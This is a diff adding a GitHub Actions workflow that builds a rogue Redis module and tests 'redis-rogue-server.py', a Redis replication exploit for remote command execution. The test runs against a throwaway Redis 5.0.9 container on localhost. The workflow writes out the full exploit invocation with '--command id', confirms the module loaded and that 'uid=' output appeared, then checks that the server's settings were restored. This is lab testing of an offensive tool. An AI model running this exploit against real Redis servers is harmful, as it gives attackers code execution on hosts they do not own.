@@ -1,0 +1,51 @@
+name: Build and disposable lab
+
+on:
+  push:
+  pull_request:
+
+jobs:
+  linux:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build module from source
+        run: |
+          make clean
+          make
+          file module.so
+          file module.so | grep -E 'ELF 64-bit LSB shared object, x86-64'
+      - name: Check Python protocol
+        run: |
+          python3 -m py_compile redis-rogue-server.py
+          python3 -m unittest discover -s tests -v
+      - name: Start disposable Redis 5.0.9
+        run: |
+          docker run -d --name redis-lab --network host redis:5.0.9 \
+            redis-server --bind 127.0.0.1 --port 16379 --protected-mode no \
+            --save "" --appendonly no
+          for attempt in $(seq 1 20); do
+            if docker exec redis-lab redis-cli -p 16379 PING | grep -qx PONG; then exit 0; fi
+            sleep 1
+          done
+          docker logs redis-lab
+          exit 1
+      - name: Execute and verify cleanup
+        shell: bash
+        run: |
+          set -euo pipefail
+          before_dir=$(docker exec redis-lab redis-cli -p 16379 --raw CONFIG GET dir | tail -n 1)
+          before_file=$(docker exec redis-lab redis-cli -p 16379 --raw CONFIG GET dbfilename | tail -n 1)
+          python3 redis-rogue-server.py \
+            --rhost 127.0.0.1 --rport 16379 \
+            --lhost 127.0.0.1 --lport 16380 \
+            --dir /tmp --command id | tee run.log
+          grep -Fq '[info] MODULE LOAD: OK' run.log
+          grep -q 'uid=' run.log
+          test "$(docker exec redis-lab redis-cli -p 16379 --raw ROLE | head -n 1)" = master
+          test "$(docker exec redis-lab redis-cli -p 16379 --raw CONFIG GET dir | tail -n 1)" = "$before_dir"
+          test "$(docker exec redis-lab redis-cli -p 16379 --raw CONFIG GET dbfilename | tail -n 1)" = "$before_file"
+          test -z "$(docker exec redis-lab redis-cli -p 16379 --raw MODULE LIST)"
+      - name: Redis diagnostics on failure
+        if: failure()
+        run: docker logs redis-lab || true
